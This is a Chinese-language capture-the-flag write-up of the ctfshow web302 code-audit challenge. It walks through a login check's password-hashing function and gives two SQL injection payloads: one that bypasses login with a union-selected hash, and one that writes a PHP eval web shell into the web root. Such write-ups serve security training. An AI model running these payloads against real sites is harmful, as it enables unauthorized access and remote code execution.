---
title: "[代码审计]实战篇:web302"
desc: TonyD0g
date: 2022-01-30 16:10:28
tags: 代码审计
---
<font size=4 >

###### [版本0x1] 
###### 2022-01-30

## 前言:
(请多多支持ctfshow,侵删)
更改一下checklogin.php的这块代码:
![avatar](https://s4.ax1x.com/2022/01/30/HCETYt.png)
源码下载:https://ctfshow.lanzoui.com/ilMPgjfeyxa

## 正文:

更改了哪里，我们就审计哪里.
![avatar](https://s4.ax1x.com/2022/01/30/HCETYt.png)

发现调用了sds_decode函数,找一下这个函数，发现在fun.php里

我们传入的userpwd经过了一系列操作:
```
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
?>
```

所以我们把web301的Payload改改:
## Payload:
Payload1:
**userpwd=1&userid=-1' union select "d9c77c4e454869d5d8da3b4be79694d3"#**

Payload2:
**userpwd=b&userid=a' union select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/a.php"#**

## 验证:
![avatar](https://s4.ax1x.com/2022/01/30/HCE7fP.png)

## 注意事项:
![avatar](https://s4.ax1x.com/2022/01/30/HCEoFI.png)

</font>

